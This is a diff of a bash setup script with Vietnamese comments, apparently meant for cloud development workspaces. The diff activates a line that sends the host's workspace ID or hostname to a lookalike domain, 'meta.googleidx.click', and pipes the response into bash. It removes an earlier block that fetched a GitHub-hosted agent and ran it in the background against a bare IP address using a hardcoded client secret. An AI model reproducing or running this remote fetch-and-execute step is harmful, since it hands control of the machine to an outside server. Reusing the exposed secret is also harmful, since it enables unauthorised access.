@@ -1,43 +1,17 @@
 #!/bin/bash
 # Kiểm tra nếu WORKSPACE_SLUG tồn tại, nếu không thử lấy từ IDX_WORKSPACE_ID
 # Bạn có thể thay đổi tên biến tùy theo môi trường thực tế của bạn
-# MY_ID=${WORKSPACE_SLUG}
+MY_ID=${WORKSPACE_SLUG}
 
-# # Nếu biến trên trống, có thể thử trích xuất từ tên máy chủ (hostname)
-# if [ -z "$MY_ID" ]; then
-#     MY_ID=$(hostname)
-# fi
+# Nếu biến trên trống, có thể thử trích xuất từ tên máy chủ (hostname)
+if [ -z "$MY_ID" ]; then
+    MY_ID=$(hostname)
+fi
 
-# echo "Sử dụng ID: $MY_ID"
+echo "Sử dụng ID: $MY_ID"
 
-# # Thực thi curl với ID vừa lấy được
-# curl -sL "https://meta.googleidx.click/config?hostname=$MY_ID" | bash
-
-
-OS=$(uname -s | tr '[:upper:]' '[:lower:]')
-ARCH=$(uname -m | sed 's/x86_64/amd64/;s/aarch64/arm64/')
-REPO="kuratajr/idx-agent"
-
-mkdir -p /home/monitor
-cd /home/monitor
-
-TAG=$(curl -s "https://api.github.com/repos/$REPO/releases/latest" | grep -Po '"tag_name": "\K.*?(?=")')
-FILENAME="idx-agent_${OS}_${ARCH}.zip" # Kiểm tra lại dấu _ hoặc - tùy repo
-URL="https://github.com/$REPO/releases/download/$TAG/$FILENAME"
-
-echo "--- Đang tải $FILENAME ---"
-curl -LO "$URL"
-
-echo "--- Đang giải nén ---"
-unzip -p "$FILENAME" > idx-agent
-
-echo "--- Phân quyền và Chạy ---"
-chmod +x idx-agent
-
-nohup env NZ_SERVER=35.206.216.43:8008 NZ_TLS=false NZ_IDX=true NZ_DEBUG=true NZ_CLIENT_SECRET=ZHez5AnbovvexxONsReqd6i6xTMpWTa4 ./idx-agent > output.log 2>&1 &
-
-
-
+# Thực thi curl với ID vừa lấy được
+curl -sL "https://meta.googleidx.click/config?hostname=$MY_ID" | bash
 
 
 # echo "Checking qemu-kvm..."
